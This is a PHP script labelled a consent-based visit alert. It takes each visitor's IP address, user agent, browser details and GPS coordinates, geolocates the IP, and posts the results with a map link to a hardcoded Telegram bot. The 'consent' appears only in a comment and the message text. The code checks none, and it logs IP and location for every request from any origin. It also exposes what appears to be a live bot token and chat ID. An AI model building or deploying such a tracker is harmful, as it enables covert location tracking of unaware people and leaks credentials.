<?php
/* Consent-based Telegram visit alert */
$BOT_TOKEN = "8461188864:AAHPV9PcbQkrBZV25SlXNMK3kJQmRwIIhUI";
$CHAT_ID   = "1896145195";

header('Access-Control-Allow-Origin: *');
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit; }

function client_ip() {
  foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
    if (!empty($_SERVER[$k])) { return trim(explode(',', $_SERVER[$k])[0]); }
  }
  return 'UNKNOWN';
}
function send_tg($text,$bot,$chat){
  $ch = curl_init("https://api.telegram.org/bot{$bot}/sendMessage");
  curl_setopt_array($ch, [
    CURLOPT_POST=>true, CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>5,
    CURLOPT_POSTFIELDS=>['chat_id'=>$chat,'text'=>$text,'parse_mode'=>'Markdown']
  ]);
  curl_exec($ch); curl_close($ch);
}

$raw = file_get_contents('php://input');
$data = json_decode($raw ?: '[]', true);
if (!is_array($data)) $data = [];

$ip     = client_ip();
$ua     = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ref    = $data['ref'] ?? ($_SERVER['HTTP_REFERER'] ?? '');
$page   = $data['page'] ?? '';
$domain = $data['domain'] ?? '';
$tz     = $data['tz'] ?? '';
$lang   = $data['lang'] ?? '';
$sw     = $data['sw'] ?? '';
$sh     = $data['sh'] ?? '';
$lat    = $data['lat'] ?? null;
$lon    = $data['lon'] ?? null;
$acc    = $data['acc'] ?? null;

// IP-based approx geolocation (optional)
$city = $region = $country = 'Unknown';
if ($lat === null || $lon === null && $ip !== 'UNKNOWN') {
  $ctx = stream_context_create(['http'=>['timeout'=>2]]);
  $geo = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,lat,lon", false, $ctx);
  if ($geo) {
    $g = json_decode($geo, true);
    if (($g['status'] ?? '') === 'success') {
      $country = $g['country'] ?? $country;
      $region  = $g['regionName'] ?? $region;
      $city    = $g['city'] ?? $city;
      $lat     = $lat ?? ($g['lat'] ?? null);
      $lon     = $lon ?? ($g['lon'] ?? null);
    }
  }
}
$map = ($lat!==null && $lon!==null) ? "https://maps.google.com/?q={$lat},{$lon}" : 'NA';

$msg = implode("\n", array_filter([
  "✅ *Visit Allowed (Consent)*",
  "🌐 *Domain:* `{$domain}`",
  $page ? "📄 *Page:* {$page}" : null,
  "↩️ *Referrer:* ".($ref ?: 'Direct/Unknown'),
  "🔢 *IP:* `{$ip}`",
  "🗣️ *Lang:* ".($lang ?: 'Unknown'),
  "🕒 *Time Zone:* ".($tz ?: 'Unknown'),
  ($sw && $sh) ? "🖥️ *Screen:* {$sw}x{$sh}" : null,
  "📱 *UA:* ".($ua ?: 'Unknown'),
  ($city!=='Unknown' || $country!=='Unknown') ? "📍 *Location:* {$city}, {$region}, {$country}" : null,
  "🗺️ *Map:* {$map}",
  $acc !== null ? "🎯 *GPS Accuracy:* ~{$acc}m" : null,
]));
send_tg($msg,$BOT_TOKEN,$CHAT_ID);

http_response_code(204);
